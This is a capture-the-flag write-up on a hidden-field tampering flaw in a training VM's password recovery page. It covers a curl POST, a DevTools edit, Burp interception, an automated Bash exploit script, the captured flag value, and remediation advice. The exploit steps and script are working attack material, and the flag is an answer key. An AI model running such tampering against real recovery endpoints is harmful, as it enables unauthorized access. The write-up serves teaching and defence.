# 🚩 Breach 14 : Recover Password - Hidden Field Tampering

## 📝 Overview

The password recovery page at `?page=recover` contains a hidden form field:

```html
<input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
```

This field is part of a legitimate workflow: users arrive at `?page=recover` by clicking the “I forgot my password” link from the signin page at `?page=signin`. 

However, the server does *not* revalidate this value; it simply trusts the client‑supplied `mail` parameter and returns the flag only when the POST‑ed value exactly equals `admin@borntosec.com`. 

Hidden fields like this are fully visible in the HTML and can be modified by any client, while the `maxlength="15"` constraint is enforced only by the browser. Command‑line tools such as `curl` ignore this attribute and send the full string, allowing the attacker to bypass the truncation and trigger the flag‑unlocking condition. 

---

## 🔍 The Vulnerability

### Client‑side trust in hidden fields

Hidden form fields are not secure even though they are not rendered visibly on the page. The field `mail` is declared as `type="hidden"`, meaning it is not displayed to the user but is still sent as part of the form submission. The server logic assumes this value is trustworthy and uses it directly as the key for displaying the flag. Because the application relies on client‑controllable data to make a security decision, it is fundamentally flawed. Hidden fields offer no confidentiality or integrity; they are just as manipulable as any visible input, and this is the core of the vulnerability. 

### Client‑side length restriction only

The `maxlength="15"` attribute is a client‑side mechanism. When the page is submitted through a normal browser, any value longer than 15 characters is truncated before the form is sent. The string `webmaster@borntosec.com` is 23 characters long, so it is cut down to `webmaster@bornt` in the request. This makes the correct value unreachable through the browser UI alone. However, tools that build raw HTTP requests—such as `curl`, scripts, or proxies like Burp Suite—do not enforce HTML attributes and can send the full, unmodified string. This mismatch between what the browser enforces and what the server expects creates the exploitation vector. 

### Missing server‑side validation and origin checks

The server expects a POST request to `?page=recover` carrying a parameter `mail` and performs a strict string comparison:

```php
if ($_POST['mail'] === 'admin@borntosec.com') {
    echo "<h2 style=\"margin-top:50px;\">The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0</h2>";
}
```

There is no validation on:
- The length of the value.
- The format of the email.
- Whether the value matches the one originally rendered in the hidden field.
- Whether the request even came from a legitimate form page.

The server simply trusts the client‑supplied string and executes the flag‑unlocking logic when it matches. This complete absence of server‑side checks is what makes the attack trivial, since any tool that can send a POST request with the correct value will trigger the flag. 

---

## 🧠 How We Derived the Target Value

The correct email `admin@borntosec.com` was not guessed randomly; it was derived from observable patterns and common naming conventions in web applications. 

### Step 1: Identify the domain

The domain `borntosec.com` appears consistently across the application: in the page footer, titles, and, crucially, in the value of the hidden `mail` field. This repetition indicates that `borntosec.com` is the authoritative email domain for the system. By observing the same domain in multiple locations, we can infer that all internal and administrative accounts are likely to use this domain in their email addresses. 

### Step 2: Analyze the existing email prefix

The default value of the hidden field is `webmaster@borntosec.com`, which uses the prefix `webmaster`. This is a common role‑based identifier for operations or web‑related administration. The presence of this value suggests that the application follows a predictable naming scheme where the prefix reflects the role and the domain remains constant. 

### Step 3: Apply common administrative conventions

Across many web applications, one of the most standard administrative email addresses is `admin@domain`. Given that the domain is `borntosec.com`, the logical step is to replace the prefix `webmaster` with `admin`, yielding `admin@borntosec.com`. This transformation aligns with widely adopted conventions and represents the single most likely candidate for triggering privileged behavior such as flag‑unlocking. 

---

## 🛠 The Exploit

### Method 1: curl command‑line exploitation

The cleanest and most direct method is to send a raw HTTP POST request using `curl`, bypassing the browser entirely. The browser enforces the `maxlength` attribute and truncates long values, but `curl` is not constrained by HTML form rules and can send the full 18‑character string `admin@borntosec.com`. This approach demonstrates that the vulnerability is purely server‑side and can be exploited without any client‑side modification. 

The command is:

```bash
curl -s -X POST "http://[VM-IP]/?page=recover" \
--data "mail=admin@borntosec.com&Submit=Submit"
```

Here:
- `-s` suppresses `curl`’s progress output for cleaner parsing.
- `-X POST` specifies the POST method, matching the form submission.
- `--data` encodes the POST body as `mail=admin@borntosec.com&Submit=Submit`, setting the tampered parameter and simulating the submit button.

The server processes the request without length validation, matches the exact string `admin@borntosec.com`, and returns an HTML fragment containing the flag. This method highlights how tools that ignore browser‑enforced constraints trivialize hidden‑field tampering when the server does not enforce the same restrictions. 

### Method 2: Browser developer tools modification

The same vulnerability can be exploited interactively using the browser’s developer tools. Instead of crafting a raw HTTP request, the user modifies the hidden field directly in the DOM before submitting the form. This technique shows that hidden fields provide no meaningful security when the browser allows dynamic editing of the page structure. 

The steps are:
1. Navigate to `http://[VM-IP]/?page=recover` in a browser.
2. Open developer tools using F12 or right‑click → Inspect Element.
3. In the Elements or Inspector tab, locate the hidden input:
   ```html
   <input type="hidden" name="mail" value="webmaster@borntosec.com" maxlength="15">
   ```
4. Double‑click the `value` attribute and change its content from `webmaster@borntosec.com` to `admin@borntosec.com`.
5. Click the form’s Submit button or press Enter.

The browser submits the modified value as if it had been rendered that way originally. Because the server performs no server‑side re‑check of the email against the initially served form, the tampered value is accepted, and the flag is displayed. This demonstrates that any client‑side state (whether hidden fields, cookies, or JavaScript variables...) can be altered by the user unless the server independently re‑validates it. 

### Method 3: Burp Suite proxy interception

A third approach uses Burp Suite as a man‑in‑the‑middle proxy to intercept and manipulate the HTTP request after the browser has constructed it. This method is common in penetration testing and shows that hidden‑field tampering is not limited to manual DOM edits or handwritten scripts; it can be done transparently while the user interacts with the application normally. 

To perform this exploit:
1. Configure the browser to route traffic through Burp Suite at `127.0.0.1:8080`.
2. Navigate to `http://[VM-IP]/?page=recover` and submit the form with the default value.
3. Observe Burp intercept the POST request in the Proxy tab.
4. In the intercepted body, change `mail=webmaster@borntosec.com` to `mail=admin@borntosec.com`.
5. Forward the altered request to the server.

The server responds with the same HTML fragment that contains the flag, exactly as it would if the parameter had been correctly set in the first place. This confirms that the vulnerability is rooted in the server’s trust in any POST body that matches the expected structure, regardless of how or where it was generated. 

---

## 🤖 Automated Exploitation Script

The following Bash script automates both discovery and exploitation. It first retrieves the default email from the page, extracts the domain, constructs the likely administrative email, and then sends a POST request to test whether the flag is returned. 

```bash
#!/bin/bash
IP="[VM-IP]"

echo "Breach 14: Hidden Field Tampering"
echo "Target: http://$IP/?page=recover"

# Extract the default email from the hidden field
DEFAULT_EMAIL=$(curl -s "http://$IP/?page=recover" | grep 'name="mail"' | sed 's/.*value="//;s/".*//')
DOMAIN=$(echo "$DEFAULT_EMAIL" | cut -d'@' -f2)

ADMIN_EMAIL="admin@$DOMAIN"

echo "Default email: $DEFAULT_EMAIL"
echo "Derived target: $ADMIN_EMAIL"

# Test the tampered value
RESPONSE=$(curl -s -X POST "http://$IP/?page=recover" \
--data "mail=$ADMIN_EMAIL&Submit=Submit")

if [[ "$RESPONSE" =~ "flag is" ]]; then
    echo "SUCCESS:"
    echo "$RESPONSE" | grep "flag is"
else
    echo "FAILED"
fi
```

This script:
- Uses `curl` to fetch the hidden field and parse its value.
- Deduces the domain from the default email and builds the administrative variant.
- Sends a POST request with the modified parameter and checks for the flag phrase in the response.

It encapsulates the logic of targeted parameter tampering, showing how straightforward automation can turn a hidden‑field vulnerability into a reproducible exploit.

---

## 🏁 Result

Upon successful exploitation, the server returns an HTML fragment similar to:

```html
<center>
<h2 style="margin-top:50px;"> The flag is : 1d4855f7337c0c14b6f44946872c4eb33853f40b2d54393fbe94f49f1e19bbb0</h2><br/>
<img src="images/win.png" alt="" width=200px height=200px>
</center>
```

This confirms that the server has accepted the client‑modified `mail` parameter and triggered the flag‑unlocking condition. Failed requests, in contrast, return the original form HTML without the flag element or success imagery, underlining that the condition is purely data‑driven and not tied to any other state. 

---

## 🌍 Real‑World Impact

Hidden field tampering is a widespread class of parameter‑tampering vulnerabilities that often lies outside traditional authentication flows. Attackers can use this technique to alter prices in shopping carts, change account identifiers, redirect recovery emails, or escalate privileges by manipulating supposedly “safe” values sent from the client. 

In real‑world systems, similar flaws have enabled:
- Unauthorized access to other users’ accounts by tampering with hidden user IDs.
- Price manipulation in e‑commerce flows by changing hidden fields that store costs or quantities.
- Hijacking of password‑reset or account‑recovery emails by changing the destination address.

Because such attacks require no valid credentials and can be carried out over standard HTTP, they are often trivial to automate at scale. This makes hidden‑field tampering a serious concern for any application that relies on client‑side data to drive security‑relevant decisions. 

---

## 🛡️ Remediation Strategies

### Store sensitive parameters server‑side

The primary defense is never to let the client control any data that influences security decisions. Instead of storing the email address in a hidden form field, the application should store it in server‑side session storage, such as PHP’s `$_SESSION`, and reference it only on the server. 

For example, when the user starts a recovery flow, the server can record the relevant email in the session:

```php
session_start();
$_SESSION['recovery_email'] = get_user_email($_SESSION['user_id']);
```

Later, when processing `?page=recover`, the server reads the email from the session and ignores any client‑supplied `mail` parameter. This removes the attack surface entirely, since the client no longer has any route to influence the value used in the comparison. 

### Treat client‑supplied parameters as untrusted input

All data arriving from the client—whether in POST bodies, GET parameters, headers, or cookies—must be treated as untrusted. If the server must accept a user‑provided email address, it should validate it against a server‑side mapping rather than allowing it to dictate outcomes such as flag‑unlocking or account access.

For example, after receiving `$_POST['mail']`, the server can:
- Look up the current authenticated user’s email.
- Compare the submitted email against the stored one.
- Reject the request if they do not match.

This approach ensures that the client cannot simply forge an email address that bypasses checks; it can only supply values that are consistent with the server‑side state.

### Implement CSRF tokens for state‑changing forms

Even if sensitive parameters are stored server‑side, forms that change state—such as password recoveries or account modifications—should be protected with CSRF tokens. A CSRF token is a unique, unpredictable value associated with the user’s session and embedded as a hidden field in the form. The server validates this token before acting on the request, ensuring that the action was initiated from a legitimate, server‑issued form rather than a forged request. 

An implementation might look like:

```php
// Generate token on page load
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}
```

```html
<input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
```

```php
// Validate on submission
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    http_response_code(403);
    exit('Invalid CSRF token');
}
```

This pattern prevents attackers from crafting off‑site or automated POST requests that exploit hidden‑field tampering, even if they can guess or manipulate the form structure. [web:19][web:24]

### Harden input validation rigorously

When client‑supplied parameters must be accepted, the server must enforce strict validation rules. This includes:
- Length checks to prevent overly long values.
- Format validation using schemas or built‑in filters (for example, PHP’s `filter_var` with `FILTER_VALIDATE_EMAIL`).
- Domain whitelisting to ensure emails belong only to allowed domains.

Example PHP logic:

```php
$email = filter_var($_POST['mail'], FILTER_VALIDATE_EMAIL);
if (!$email || strlen($email) > 254 || !in_array(explode('@', $email)[1], ['borntosec.com'])) {
    http_response_code(400);
    exit('Invalid email parameter');
}
```

Such checks prevent trivial tampering attempts and force attackers to conform to the server’s expected data model, greatly increasing the difficulty of exploitation. 

### Replace form‑based recovery with secure token‑based flows

Form‑based password recovery, where the client directly specifies the email address, is inherently risky because it exposes the recovery mechanism to parameter tampering. A more secure design uses a token‑based workflow delivered over email. 

In such a design:
1. The user submits their email address on the recovery page.
2. The server verifies the email against its database and generates a time‑limited, cryptographically signed token.
3. An email is sent to the user containing a link like:
   `https://example.com/reset?token=abc123`
4. When the link is clicked, the server validates the token, checks its expiry, and allows the recovery only if the token is valid.

Because the token is generated server‑side and validated cryptographically, the client cannot forge it. This design removes the need for any client‑supplied email address in the sensitive recovery step, closing the hidden‑field tampering vector.

### Apply rate limiting and account‑level protections

To prevent abuse of the recovery endpoint, the server should enforce rate limits on password‑reset or recovery‑related actions. For example:
- Allow a small number of recovery attempts per IP address or per user account within a fixed time window (for instance, 3 attempts per hour). 
- After a threshold of failed attempts, require a CAPTCHA challenge before permitting further attempts.
- After repeated failures, temporarily lock or throttle the account for a short period.


These measures make automated brute‑forcing or enumeration of email addresses far more difficult and costly for an attacker, while still allowing legitimate users to recover their accounts with only a small amount of additional friction. They also make it easier to detect abuse patterns, since repeated failures from a single IP or user become obvious and can be flagged for further investigation or automated blocking.

Monitor and log suspicious activity
The application should actively log failed validation events and unusual patterns around the recovery endpoint. For example, repeated attempts to submit out‑of‑bound email addresses, very long values, or malformed formats should be recorded in server logs. Aggregated logs can be reviewed or fed into a SIEM or monitoring system to detect spikes in failure rates, repeated tampering‑like patterns, or clustering of requests from a single source.

In addition, logging should include enough context, such as IP address, timestamp, session ID (if available), and the exact parameter value, so to make it possible for an analyst to reconstruct an attack chain. 

Moreover, detailed error messages should not be exposed to the user; instead, the application should return generic messages while the full details remain in the logs. This balances transparency for incident responders with the need to avoid revealing internal logic or validation rules to attackers.

Finally, the monitoring layer should be tuned to trigger alerts on clearly suspicious behavior, such as a sudden surge of tampered recovery attempts or a single IP hitting multiple accounts in a short time. Such alerts can prompt manual review, temporary blocking, or rotation of secrets, significantly increasing the resilience of the recovery flow even if an attacker finds a new parameter‑tampering path.